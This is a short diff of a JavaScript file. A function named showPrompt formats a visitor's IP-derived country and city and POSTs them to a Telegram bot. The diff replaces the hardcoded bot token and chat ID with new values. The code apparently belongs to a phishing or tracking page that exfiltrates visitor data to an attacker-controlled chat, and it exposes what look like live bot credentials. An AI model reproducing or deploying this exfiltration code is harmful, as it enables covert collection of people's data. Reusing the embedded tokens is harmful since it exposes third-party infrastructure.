@@ -167,8 +167,8 @@ function showPrompt(IpAddress) {
 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
 <strong>City: </strong><code>${IpAddress.city}</code>`;
 
-        const token = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
-        const chat_id = '-1002416068664';
+        const token = '8126822408:AAEgKJQjvAmbQWknxZ7aNbA9P8ti7XN4HTw';
+        const chat_id = '-4973700232';
 
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
